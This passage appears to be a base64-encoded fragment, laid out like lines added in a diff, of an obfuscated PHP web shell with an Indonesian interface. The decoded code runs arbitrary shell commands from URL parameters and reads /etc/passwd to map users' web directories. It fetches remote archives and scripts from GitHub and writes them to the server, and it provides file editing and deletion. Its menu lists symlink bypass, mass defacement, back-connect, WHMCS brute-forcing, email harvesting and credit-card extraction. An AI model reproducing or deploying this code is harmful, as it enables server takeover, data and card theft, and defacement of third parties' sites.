+dGQ+PC90cj4iOwokeDE1NSsrOwogICAgICAgICAgICAgICAgZmx1c2goKTsKICAgICAgICAgICAg
+ICAgICR4NGE9JHg0YT8wOjE7CiAgICAgICAgICAgICAgICAkeDE2NCsrOwoJCQkJfQogICAgICAg
+ICAgICB9CgkJCX0KZWNobyAnPC90YWJsZT4nOyAKJHgxNWEgPSAkeDE1NTsKZWNobyAnPGJyPjxk
+aXYgY2xhc3M9InJlc3VsdCI+VG90YWwgY1BhbmVsIFlhbmcgS2V0ZW11ID0gJy4keDE1YS4nPC9o
+Mz48YnIgLz4nOwplY2hvICc8L2NlbnRlcj4nOwoKfQp9ZWxzZXsKZWNobyAnPGNlbnRlcj4nOwpl
+Y2hvICI8YSBocmVmPVwiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0FudG9uaW8uSHNIXCI+PGlt
+ZyBjbGFzcz1cImxvZ29cIiBzcmM9XCJodHRwczovLzMuYnAuYmxvZ3Nwb3QuY29tLy1rcXlmVVBv
+dXFZay9WdFlTMGxVLXVmSS9BQUFBQUFBQUFEdy81NzA3c0YxTll3by9zMTYwMC9NZW1JbWc0MDIu
+Z2lmXCIgYWx0PVwiTWlvbm9vbiwuLlwiPjwvYT48YnI+PGJyPlxuIjsKZWNobyAiPGRpdiBjbGFz
+cz0ncmVzdWx0Jz48aT48Zm9udCBjb2xvcj0nI0ZGMDAwMCc+U2VydmVyIGluaSBUaWRhayBCaXNh
+PC9mb250Pjxicj48Zm9udCBjb2xvcj0nI0ZGMDAwMCc+L3Zhci9uYW1lZDwvZm9udD4gb3IgPGZv
+bnQgY29sb3I9JyNGRjAwMDAnPmV0Yy9uYW1lZC5jb25mIDwvZm9udD5UaWRhayBEaSB0ZW11a2Fu
+IDwvaT48L2Rpdj48YnI+PC9jZW50ZXI+IjsKfQoJfQppZiAoIGlzc2V0KCRfR0VUWydOZ2luY2Vu
+ZyddKSApCnsKc2V0X3RpbWVfbGltaXQoMCk7CkAkeDE2MiA9IGZvcGVuKCcvZXRjL3Bhc3N3ZCcs
+J3InKTsKaWYgKCEkeDE2MikgeyBkaWUoJzxiPlsrXSBFUlJPUiB8IEdBIEJJU0EgQkFDQSAvZXRj
+L3Bhc3N3ZCBbK108L2I+Jyk7IH0KJHgxNjUgPSBhcnJheSgpOwokeDE2NiA9IGFycmF5KCk7CiR4
+MTY3ID0gYXJyYXkoKTsKJHg4YyA9IDA7CndoaWxlKCFmZW9mKCR4MTYyKSkKewokeDEyID0gZmdl
+dHMoJHgxNjIpOwppZiAoJHg4YyA+IDEwKQp7CiR4NDYgPSBzdHJwb3MoJHgxMiwnOicpOwokeDNh
+ID0gc3Vic3RyKCR4MTIsMCwkeDQ2KTsKJHgxNTggPSAnL2hvbWUvJy4keDNhLicvcHVibGljX2h0
+bWwvJzsKaWYgKCgkeDNhICE9ICcnKSkKewppZiAoaXNfcmVhZGFibGUoJHgxNTgpKQp7CmFycmF5
+X3B1c2goJHgxNjYsJHgzYSk7CmFycmF5X3B1c2goJHgxNjUsJHgxNTgpOwp9Cn0KfQokeDhjKys7
+Cn0KZWNobyAnPGJyPjxicj4nOwplY2hvICI8Y2VudGVyPjxiPlsrXSBOZ2ludGlwICIuc2l6ZW9m
+KCR4MTY1KS4iIEphbmRhIi4iIFsrXTwvYj48YnIvPjxici8+IjsKZm9yZWFjaCAoJHgxNjYgYXMg
+JHgxMDIpCnsKJHhiNyA9ICIvaG9tZS8keDEwMi9wdWJsaWNfaHRtbC8iOwplY2hvICI8YSBocmVm
+PSc/eSYjNjE7JHhiNycgdGFyZ2V0PSdfYmxhbmsnIHN0eWxlPSdmb250LXdlaWdodDpib2xkOyBj
+b2xvcjojOyc+JHhiNzwvYT48YnI+IjsKfQplY2hvICI8YnI+IjsKZWNobyAnPC9jZW50ZXI+PC9i
+b2R5PjwvaHRtbD4nOwoJfQoJaWYoJF9HRVRbJ2V4dHJhY3QnXSl7ZWNobyI8cHJlPiIuc2hlbGxf
+ZXhlYygkX0dFVFsiZXh0cmFjdCJdKTt9CmlmICggaXNzZXQoJF9HRVRbJ2luc3RhbGx0bXAnXSkg
+KQoKewokeDE2OCA9ICJodHRwczovL2dpdGh1Yi5jb20vYW50b25pb2xhL2phbmNvay9ibG9iL21h
+c3Rlci90bXAuemlwP3Jhdz10cnVlIjsKJHgyOSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR4MTY4KTsK
+JHgxNjkgPSBmb3BlbigidG1wLnppcCIgLCAndycpOwpmd3JpdGUoJHgxNjksJHgyOSk7CmZjbG9z
+ZSgkeDE2OSk7CmNobW9kICgidG1wLnppcCIgLCAwNzU1KTsKZWNobyAnPGZvbnQgY29sb3IgPVwn
+bGltZVwnPkJlcmhhc2lsIE1lbmdoaW5zdGFsbDxicj4nOwoJfQppZiAoIGlzc2V0KCRfR0VUWydz
+Y21wZyddKSApCnsKJHgxNmEgPSAiaHR0cHM6Ly9naXRodWIuY29tL2FudG9uaW9sYS9yZWpla2kv
+YmxvYi9tYXN0ZXIvQXBwbGVJRC56aXA/cmF3PXRydWUiOwokeDI5ID0gZmlsZV9nZXRfY29udGVu
+dHMoJHgxNmEpOwokeDE2OSA9IGZvcGVuKCJBcHBsZUlELnppcCIgLCAndycpOwpmd3JpdGUoJHgx
+NjksJHgyOSk7CmZjbG9zZSgkeDE2OSk7CmNobW9kICgiQXBwbGVJRC56aXAiICwgMDc1NSk7CmVj
+aG8gJzxmb250IGNvbG9yID1cJ2xpbWVcJz5CZXJoYXNpbCBNZW5naGluc3RhbGx0bXA8YnI+JzsK
+CX0KaWYgKCBpc3NldCgkX0dFVFsnQWRtUiddKSApCnsKJHgxNmIgPSAiaHR0cHM6Ly9yYXcuZ2l0
+aHVidXNlcmNvbnRlbnQuY29tL2FudG9uaW9sYS9yZWpla2kvbWFzdGVyL3lvaS5waHAiOwokeDI5
+ID0gZmlsZV9nZXRfY29udGVudHMoJHgxNmIpOwokeDE2OSA9IGZvcGVuKCJhZG0ucGhwIiAsICd3
+Jyk7CmZ3cml0ZSgkeDE2OSwkeDI5KTsKZmNsb3NlKCR4MTY5KTsKY2htb2QgKCJhZG0ucGhwIiAs
+IDA3NTUpOwplY2hvICc8Zm9udCBjb2xvciA9XCdsaW1lXCc+QWRtaW5lciBCZXJoYXNpbCBEaSBQ
+YXNhbmcgLS0tPiA8YSBocmVmPSJhZG0ucGhwIj48Zm9udCBjb2xvciA9XCdhcXVhXCc+QnVrYTwv
+YT4gJzsKCX0KCWlmKGlzc2V0KCRfR0VUWydwYXRoJ10pKXsKCSR4YjcgPSAkX0dFVFsncGF0aCdd
+OwoJfWVsc2V7CgkkeGI3ID0gZ2V0Y3dkKCk7Cgl9CgkkeGI3ID0gc3RyX3JlcGxhY2UoJ1xcJywn
+LycsJHhiNyk7CgkkeDE2YyA9IGV4cGxvZGUoJy8nLCR4YjcpOwoKCWZvcmVhY2goJHgxNmMgYXMg
+JHgxNmQ9PiR4MTZlKXsKCWlmKCR4MTZlID09ICcnICYmICR4MTZkID09IDApewoJJHgxMmUgPSB0
+cnVlOwoJZWNobyAnPGEgaHJlZj0iP3BhdGg9LyI+LzwvYT4nOwoJY29udGludWU7Cgl9CglpZigk
+eDE2ZSA9PSAnJykgY29udGludWU7CgllY2hvICc8YSBocmVmPSI/cGF0aD0nOwoJZm9yKCR4OGM9
+MDskeDhjPD0keDE2ZDskeDhjKyspewoJZWNobyAiJHgxNmNbJHg4Y10iOwoJaWYoJHg4YyAhPSAk
+eDE2ZCkgZWNobyAiLyI7Cgl9CgllY2hvICciPicuJHgxNmUuJzwvYT4vJzsKCX0KCWVjaG8gJzwv
+dGQ+PC90cj48dHI+PHRkPic7CgllY2hvICd8PGEgaHJlZj0iPyI+PGlucHV0IGNsYXNzPSJidXR0
+b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9SG9tZT48L2E+fDxhIGhyZWY9Ij9Dcm9vdCI+PGlucHV0
+IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9VXBsb2FkPjwvYT58PGEgaHJlZj0i
+P1VhZVoiPjxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVlPVVwbG9hZC1B
+dXRvLUV4dHJhY3QtWmlwPjwvYT58PGEgaHJlZj0iP05naW5jZW5nIj48aW5wdXQgY2xhc3M9ImJ1
+dHRvbiIgdHlwZT0iYnV0dG9uIiB2YWx1ZT1KYW1waW5nPjwvYT58PGEgaHJlZj0iP0NwQyI+PGlu
+cHV0IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9Q1BhbmVsLUNyb290PjwvYT58
+PGEgaHJlZj0iP1VkTXMiPjxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVl
+PVVzZXItRG9tYWluPjwvYT58PGEgaHJlZj0iP0FkbVIiPjxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0
+eXBlPSJidXR0b24iIHZhbHVlPUFkbWluZXI+PC9hPnw8YSBocmVmPSI/U21wSyI+PGlucHV0IGNs
+YXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9U3ltbGluayZDcmFjay1DUGFuZWw+PC9h
+Pnw8YSBocmVmPSI/c3dzPXN5bSI+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIg
+dmFsdWU9VXNlci1Eb21haW5zLVN5bWxpbms+PC9hPnw8YSBocmVmPSI/c3dzPXBhc3N3ZCIiPjxp
+bnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVlPVN5bWxpbmstQnlwYXNzPjwv
+YT58PGEgaHJlZj0iP3N3cz1yZWFkIj48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0iYnV0dG9u
+IiB2YWx1ZT1TeW1saW5rLUJ5cGFzcy1SZWFkPjwvYT58PGEgaHJlZj0iP3N3cz1qb29tbGEiPjxp
+bnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVlPVN5bWxpbmstTWFzcy1Kb29t
+bGE+PC9hPnw8YSBocmVmPSI/c3dzPXdwIj48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0iYnV0
+dG9uIiB2YWx1ZT1TeW1saW5rLU1hc3MtV29yZFByZXNzPjwvYT58PGEgaHJlZj0iP3N3cz12YiI+
+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9U3ltbGluay1NYXNzLXZC
+dWxsZXRpbj48L2E+fDxhIGhyZWY9Ij9zd3M9aGVscCI+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5
+cGU9ImJ1dHRvbiIgdmFsdWU9U3ltbGluay1JbmZvPjwvYT58PGEgaHJlZj0iP1JtRHMiPjxpbnB1
+dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVlPVJvb3RpbmctTWFzc2RlZmFjZT48
+L2E+fDxhIGhyZWY9Ij9Td1BKbVBMIj48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0iYnV0dG9u
+IiB2YWx1ZT1TY2FuZXItV1AtSm9NLVBsdWdpbj48L2E+fDxhIGhyZWY9Ij9iYWNrIj48aW5wdXQg
+Y2xhc3M9ImJ1dHRvbiIgdHlwZT0iYnV0dG9uIiB2YWx1ZT1CYWNrLUNvbm5lY3Q+PC9hPnw8YSBo
+cmVmPSI/V2htY3oyMTEiPjxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVl
+PUJydXRlLVdobWNzPjwvYT58PGEgaHJlZj0iP1NiTiI+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5
+cGU9ImJ1dHRvbiIgdmFsdWU9U2FidW4+PC9hPnw8YSBocmVmPSI/WGRScExzIj48aW5wdXQgY2xh
+c3M9ImJ1dHRvbiIgdHlwZT0iYnV0dG9uIiB2YWx1ZT1YbWFzLURydXBhbD48L2E+fDxhIGhyZWY9
+Ij9TbG9ST2thTiI+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9U3lt
+bGluay1XcC1KTT48L2E+fDxhIGhyZWY9Ij9pbnN0YWxsdG1wIj48aW5wdXQgY2xhc3M9ImJ1dHRv
+biIgdHlwZT0iYnV0dG9uIiB2YWx1ZT1hcGk+PC9hPnw8YSBocmVmPSI/c2NtcGciPjxpbnB1dCBj
+bGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZhbHVlPUFwcGVsPjwvYT58PGEgaHJlZj0iP2V4
+dHJhY3Q9dW56aXAgdG1wLnppcCI+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIg
+dmFsdWU9RXh0cmFjdC1BcGk+PC9hPnw8YSBocmVmPSI/ZXh0cmFjdD11bnppcCBBcHBsZUlELnpp
+cCI+PGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9ImJ1dHRvbiIgdmFsdWU9RXh0cmFjdC1BcHBl
+bD48L2E+fDxhIGhyZWY9Ij9NIj48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0iYnV0dG9uIiB2
+YWx1ZT1NYWlsZXI+PC9hPnw8YSBocmVmPSI/RXhFIj48aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlw
+ZT0iYnV0dG9uIiB2YWx1ZT1FbWFpbC1FeHRyYWN0b3I+PC9hPnw8YSBocmVmPSI/UG1FIj48aW5w
+dXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0iYnV0dG9uIiB2YWx1ZT1QZW1pc2FoLUVtYWlsPjwvYT58
+PGEgaHJlZj0iP0V4VHJQQ2MiPjxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJidXR0b24iIHZh
+bHVlPUV4dHJhcC1DQz48L2E+fDxhIGhyZWY9Ij9EZENjIj48aW5wdXQgY2xhc3M9ImJ1dHRvbiIg
+dHlwZT0iYnV0dG9uIiB2YWx1ZT1EZWNvZGUtQ0M+PC9hPnwKCTwvZm9ybT4KCTwvdGQ+PC90cj4n
+OwoJaWYoaXNzZXQoJF9HRVRbJ2ZpbGVzcmMnXSkpewoJZWNobyAiPHRyPjx0ZD5DdXJyZW50IEZp
+bGUgOiAiOwoJZWNobyAkX0dFVFsnZmlsZXNyYyddOwoJZWNobyAnPC90cj48L3RkPjwvdGFibGU+
+PGJyIC8+JzsKCWVjaG8oJzxwcmU+Jy5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRz
+KCRfR0VUWydmaWxlc3JjJ10pKS4nPC9wcmU+Jyk7Cgl9ZWxzZWlmKGlzc2V0KCRfR0VUWydvcHRp
+b24nXSkgJiYgJF9QT1NUWydvcHQnXSAhPSAnZGVsZXRlJyl7CgllY2hvICc8L3RhYmxlPjxiciAv
+PjxjZW50ZXI+Jy4kX1BPU1RbJ3BhdGgnXS4nPGJyIC8+PGJyIC8+JzsKCWlmKCRfUE9TVFsnb3B0
+J10gPT0gJ2NobW9kJyl7CglpZihpc3NldCgkX1BPU1RbJ3Blcm0nXSkpewoJaWYoY2htb2QoJF9Q
+T1NUWydwYXRoJ10sJF9QT1NUWydwZXJtJ10pKXsKCWVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+
+Q2hhbmdlIFBlcm1pc3Npb24gU3Vrc2VzPC9mb250PjxiciAvPic7Cgl9ZWxzZXsKCWVjaG8gJzxm
+b250IGNvbG9yPSJyZWQiPkNoYW5nZSBQZXJtaXNzaW9uIE9yYWlzbyBDb2s8L2ZvbnQ+PGJyIC8+
+JzsKCX0KCX0KCWVjaG8gJzxmb3JtIG1ldGhvZD0iUE9TVCI+CglQZXJtaXNzaW9uIDogPGlucHV0
+IG5hbWU9InBlcm0iIHR5cGU9InRleHQiIHNpemU9IjQiIHZhbHVlPSInLnN1YnN0cihzcHJpbnRm
+KCclbycsIGZpbGVwZXJtcygkX1BPU1RbJ3BhdGgnXSkpLCAtNCkuJyIgLz4KCTxpbnB1dCB0eXBl
+PSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRfUE9TVFsncGF0aCddLiciPgoJPGlucHV0
+IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3B0IiB2YWx1ZT0iY2htb2QiPgoJPGlucHV0IHR5cGU9InN1
+Ym1pdCIgdmFsdWU9IkdvIiAvPgoJPC9mb3JtPic7Cgl9ZWxzZWlmKCRfUE9TVFsnb3B0J10gPT0g
+J3JlbmFtZScpewoJaWYoaXNzZXQoJF9QT1NUWyduZXduYW1lJ10pKXsKCWlmKHJlbmFtZSgkX1BP
+U1RbJ3BhdGgnXSwkeGI3LicvJy4kX1BPU1RbJ25ld25hbWUnXSkpewoJZWNobyAnPGZvbnQgY29s
+b3I9ImdyZWVuIj5DaGFuZ2UgTmFtZSBCZXJoYXNpbDwvZm9udD48YnIgLz4nOwoJfWVsc2V7Cgll
+Y2hvICc8Zm9udCBjb2xvcj0icmVkIj5DaGFuZ2UgTmFtZSBPcmFpc28gQ29rPC9mb250PjxiciAv
+Pic7Cgl9CgkkX1BPU1RbJ25hbWUnXSA9ICRfUE9TVFsnbmV3bmFtZSddOwoJfQoJZWNobyAnPGZv
+cm0gbWV0aG9kPSJQT1NUIj4KCU5ldyBOYW1lIDogPGlucHV0IG5hbWU9Im5ld25hbWUiIHR5cGU9
+InRleHQiIHNpemU9IjIwIiB2YWx1ZT0iJy4kX1BPU1RbJ25hbWUnXS4nIiAvPgoJPGlucHV0IHR5
+cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9IicuJF9QT1NUWydwYXRoJ10uJyI+Cgk8aW5w
+dXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcHQiIHZhbHVlPSJyZW5hbWUiPgoJPGlucHV0IHR5cGU9
+InN1Ym1pdCIgdmFsdWU9IkdvIiAvPgoJPC9mb3JtPic7Cgl9ZWxzZWlmKCRfUE9TVFsnb3B0J10g
+PT0gJ2VkaXQnKXsKCWlmKGlzc2V0KCRfUE9TVFsnc3JjJ10pKXsKCSR4YjIgPSBmb3BlbigkX1BP
+U1RbJ3BhdGgnXSwndycpOwoJaWYoZndyaXRlKCR4YjIsJF9QT1NUWydzcmMnXSkpewoJZWNobyAn
+PGZvbnQgY29sb3I9ImdyZWVuIj5FZGl0IEZpbGUgQmVyaGFzaWw8L2ZvbnQ+PGJyIC8+JzsKCX1l
+bHNlewoJZWNobyAnPGZvbnQgY29sb3I9InJlZCI+RWRpdCBGaWxlIE9yYWkgSXNvIENvazwvZm9u
+dD48YnIgLz4nOwoJfQoJZmNsb3NlKCR4YjIpOwoJfQoJZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NU
+Ij4KCTx0ZXh0YXJlYSBjb2xzPTgwIHJvd3M9MjAgbmFtZT0ic3JjIj4nLmh0bWxzcGVjaWFsY2hh
+cnMoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydwYXRoJ10pKS4nPC90ZXh0YXJlYT48YnIgLz4K
+CTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRfUE9TVFsncGF0aCdd
+LiciPgoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ib3B0IiB2YWx1ZT0iZWRpdCI+Cgk8aW5w
+dXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR28iIC8+Cgk8L2Zvcm0+JzsKCX0KCWVjaG8gJzwvY2Vu
+dGVyPic7Cgl9ZWxzZXsKCWVjaG8gJzwvdGFibGU+PGJyIC8+PGNlbnRlcj4nOwoJaWYoaXNzZXQo
+JF9HRVRbJ29wdGlvbiddKSAmJiAkX1BPU1RbJ29wdCddID09ICdkZWxldGUnKXsKCWlmKCRfUE9T
+VFsndHlwZSddID09ICdkaXInKXsKCWlmKHJtZGlyKCRfUE9TVFsncGF0aCddKSl7CgllY2hvICc8
+Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBEaXIgU3Vrc2VzPC9mb250PjxiciAvPic7Cgl9ZWxz
+ZXsKCWVjaG8gJzxmb250IGNvbG9yPSJyZWQiPkRlbGV0ZSBEaXIgT3JhaXNvIENvazwvZm9udD48
+YnIgLz4nOwoJfQoJfWVsc2VpZigkX1BPU1RbJ3R5cGUnXSA9PSAnZmlsZScpewoJaWYodW5saW5r
+KCRfUE9TVFsncGF0aCddKSl7CgllY2hvICc8Zm9udCBjb2xvcj0iZ3JlZW4iPkRlbGV0ZSBGaWxl
+IFN1a3Nlcy48L2ZvbnQ+PGJyIC8+JzsKCX1lbHNlewoJZWNobyAnPGZvbnQgY29sb3I9InJlZCI+
+RGVsZXRlIEZpbGUgT3JhaXNvIENvazwvZm9udD48YnIgLz4nOwoJfQoJfQoJfQoJZWNobyAnPC9j
+ZW50ZXI+JzsKCSR4MTZmID0gc2NhbmRpcigkeGI3KTsKCWVjaG8gJzxkaXYgaWQ9ImNvbnRlbnQi
+Pjx0YWJsZSB3aWR0aD0iNzAwIiBib3JkZXI9IjAiIGNlbGxwYWRkaW5nPSIzIiBjZWxsc3BhY2lu
+Zz0iMSIgYWxpZ249ImNlbnRlciI+Cgk8dHIgY2xhc3M9ImZpcnN0Ij4KCTx0ZD48Y2VudGVyPk5h
+bWU8L2NlbnRlcj48L3RkPgoJPHRkPjxjZW50ZXI+U2l6ZTwvY2VudGVyPjwvdGQ+Cgk8dGQ+PGNl
+bnRlcj5QZXJtaXNzaW9uczwvY2VudGVyPjwvdGQ+Cgk8dGQ+PGNlbnRlcj5PcHRpb25zPC9jZW50
+ZXI+PC90ZD4KCTwvdHI+JzsKCglmb3JlYWNoKCR4MTZmIGFzICR4MTcwKXsKCWlmKCFpc19kaXIo
+IiR4YjcvJHgxNzAiKSB8fCAkeDE3MCA9PSAnLicgfHwgJHgxNzAgPT0gJy4uJykgY29udGludWU7
+CgllY2hvICI8dHI+Cgk8dGQ+PGEgaHJlZj1cIj9wYXRoPSR4YjcvJHgxNzBcIj4keDE3MDwvYT48
+L3RkPgoJPHRkPjxjZW50ZXI+LS08L2NlbnRlcj48L3RkPgoJPHRkPjxjZW50ZXI+IjsKCWlmKGlz
+X3dyaXRhYmxlKCIkeGI3LyR4MTcwIikpIGVjaG8gJzxmb250IGNvbG9yPSJncmVlbiI+JzsKCWVs
+c2VpZighaXNfcmVhZGFibGUoIiR4YjcvJHgxNzAiKSkgZWNobyAnPGZvbnQgY29sb3I9InJlZCI+
+JzsKCWVjaG8gcGVybXMoIiR4YjcvJHgxNzAiKTsKCWlmKGlzX3dyaXRhYmxlKCIkeGI3LyR4MTcw
+IikgfHwgIWlzX3JlYWRhYmxlKCIkeGI3LyR4MTcwIikpIGVjaG8gJzwvZm9udD4nOwoKCWVjaG8g
+IjwvY2VudGVyPjwvdGQ+Cgk8dGQ+PGNlbnRlcj48Zm9ybSBtZXRob2Q9XCJQT1NUXCIgYWN0aW9u
+PVwiP29wdGlvbiZwYXRoPSR4YjdcIj4KCTxzZWxlY3QgbmFtZT1cIm9wdFwiPgoJPG9wdGlvbiB2
+YWx1ZT1cIlwiPjwvb3B0aW9uPgoJPG9wdGlvbiB2YWx1ZT1cImRlbGV0ZVwiPkRlbGV0ZTwvb3B0
+aW9uPgoJPG9wdGlvbiB2YWx1ZT1cImNobW9kXCI+Q2htb2Q8L29wdGlvbj4KCTxvcHRpb24gdmFs
+dWU9XCJyZW5hbWVcIj5SZW5hbWU8L29wdGlvbj4KCTwvc2VsZWN0PgoJPGlucHV0IHR5cGU9XCJo
+aWRkZW5cIiBuYW1lPVwidHlwZVwiIHZhbHVlPVwiZGlyXCI+Cgk8aW5wdXQgdHlwZT1cImhpZGRl
+blwiIG5hbWU9XCJuYW1lXCIgdmFsdWU9XCIkeDE3MFwiPgoJPGlucHV0IHR5cGU9XCJoaWRkZW5c
+IiBuYW1lPVwicGF0aFwiIHZhbHVlPVwiJHhiNy8keDE3MFwiPgoJPGlucHV0IHR5cGU9XCJzdWJt
+aXRcIiB2YWx1ZT1cIlsgX19fUGlqZXRfX18gXVwiIC8+Cgk8L2Zvcm0+PC9jZW50ZXI+PC90ZD4K
+CTwvdHI+IjsKCX0KCWVjaG8gJzx0ciBjbGFzcz0iZmlyc3QiPjx0ZD48L3RkPjx0ZD48L3RkPjx0
+ZD48L3RkPjx0ZD48L3RkPjwvdHI+JzsKCWZvcmVhY2goJHgxNmYgYXMgJHgyOSl7CglpZighaXNf
+ZmlsZSgiJHhiNy8keDI5IikpIGNvbnRpbnVlOwoJJHgxNzEgPSBmaWxlc2l6ZSgiJHhiNy8keDI5
+IikvMTAyNDsKCSR4MTcxID0gcm91bmQoJHgxNzEsMyk7CglpZigkeDE3MSA+PSAxMDI0KXsKCSR4
+MTcxID0gcm91bmQoJHgxNzEvMTAyNCwyKS4nIE1CJzsKCX1lbHNlewoJJHgxNzEgPSAkeDE3MS4n
+IEtCJzsKCX0KCgllY2hvICI8dHI+Cgk8dGQ+PGEgaHJlZj1cIj9maWxlc3JjPSR4YjcvJHgyOSZw
+YXRoPSR4YjdcIj4keDI5PC9hPjwvdGQ+Cgk8dGQ+PGNlbnRlcj4iLiR4MTcxLiI8L2NlbnRlcj48
+L3RkPgoJPHRkPjxjZW50ZXI+IjsKCWlmKGlzX3dyaXRhYmxlKCIkeGI3LyR4MjkiKSkgZWNobyAn
+PGZvbnQgY29sb3I9ImdyZWVuIj4nOwoJZWxzZWlmKCFpc19yZWFkYWJsZSgiJHhiNy8keDI5Iikp
+IGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPic7CgllY2hvIHBlcm1zKCIkeGI3LyR4MjkiKTsKCWlm
+KGlzX3dyaXRhYmxlKCIkeGI3LyR4MjkiKSB8fCAhaXNfcmVhZGFibGUoIiR4YjcvJHgyOSIpKSBl
+Y2hvICc8L2ZvbnQ+JzsKCWVjaG8gIjwvY2VudGVyPjwvdGQ+Cgk8dGQ+PGNlbnRlcj48Zm9ybSBt
+ZXRob2Q9XCJQT1NUXCIgYWN0aW9uPVwiP29wdGlvbiZwYXRoPSR4YjdcIj4KCTxzZWxlY3QgbmFt
+ZT1cIm9wdFwiPgoJPG9wdGlvbiB2YWx1ZT1cIlwiPjwvb3B0aW9uPgoJPG9wdGlvbiB2YWx1ZT1c
+ImRlbGV0ZVwiPkRlbGV0ZTwvb3B0aW9uPgoJPG9wdGlvbiB2YWx1ZT1cImNobW9kXCI+Q2htb2Q8
+L29wdGlvbj4KCTxvcHRpb24gdmFsdWU9XCJyZW5hbWVcIj5SZW5hbWU8L29wdGlvbj4KCTxvcHRp
+b24gdmFsdWU9XCJlZGl0XCI+RWRpdDwvb3B0aW9uPgoJPC9zZWxlY3Q+Cgk8aW5wdXQgdHlwZT1c
+ImhpZGRlblwiIG5hbWU9XCJ0eXBlXCIgdmFsdWU9XCJmaWxlXCI+Cgk8aW5wdXQgdHlwZT1cImhp
+ZGRlblwiIG5hbWU9XCJuYW1lXCIgdmFsdWU9XCIkeDI5XCI+Cgk8aW5wdXQgdHlwZT1cImhpZGRl
+blwiIG5hbWU9XCJwYXRoXCIgdmFsdWU9XCIkeGI3LyR4MjlcIj4KCTxpbnB1dCB0eXBlPVwic3Vi
+bWl0XCIgdmFsdWU9XCJbIF9fX1BpamV0X19fIF1cIiAvPgoJPC9mb3JtPjwvY2VudGVyPjwvdGQ+
+Cgk8L3RyPiI7Cgl9CgllY2hvICc8L3RhYmxlPgoJPC9kaXY+JzsKCX0KCWVjaG8gJwoJPC9CT0RZ
+PgoJPC9IVE1MPic7CglmdW5jdGlvbiBwZXJtcygkeDI5KXsKCSR4MTcyID0gZmlsZXBlcm1zKCR4
+MjkpOwoKCWlmICgoJHgxNzIgJiAweEMwMDApID09IDB4QzAwMCkgewoJLy8gU29ja2V0CgkkeDE3
+MyA9ICdzJzsKCX0gZWxzZWlmICgoJHgxNzIgJiAweEEwMDApID09IDB4QTAwMCkgewoJLy8gU3lt
+Ym9saWMgTGluawoJJHgxNzMgPSAnbCc7Cgl9IGVsc2VpZiAoKCR4MTcyICYgMHg4MDAwKSA9PSAw
+eDgwMDApIHsKCS8vIFJlZ3VsYXIKCSR4MTczID0gJy0nOwoJfSBlbHNlaWYgKCgkeDE3MiAmIDB4
+NjAwMCkgPT0gMHg2MDAwKSB7CgkvLyBCbG9jayBzcGVjaWFsCgkkeDE3MyA9ICdiJzsKCX0gZWxz
+ZWlmICgoJHgxNzIgJiAweDQwMDApID09IDB4NDAwMCkgewoJLy8gRGlyZWN0b3J5CgkkeDE3MyA9
+ICdkJzsKCX0gZWxzZWlmICgoJHgxNzIgJiAweDIwMDApID09IDB4MjAwMCkgewoJLy8gQ2hhcmFj
+dGVyIHNwZWNpYWwKCSR4MTczID0gJ2MnOwoJfSBlbHNlaWYgKCgkeDE3MiAmIDB4MTAwMCkgPT0g
+MHgxMDAwKSB7CgkvLyBGSUZPIHBpcGUKCSR4MTczID0gJ3AnOwoJfSBlbHNlIHsKCS8vIFVua25v
+d24KCSR4MTczID0gJ3UnOwoJfQoKCS8vIE93bmVyCgkkeDE3MyAuPSAoKCR4MTcyICYgMHgwMTAw
+KSA/ICdyJyA6ICctJyk7CgkkeDE3MyAuPSAoKCR4MTcyICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7
+CgkkeDE3MyAuPSAoKCR4MTcyICYgMHgwMDQwKSA/CgkoKCR4MTcyICYgMHgwODAwKSA/ICdzJyA6
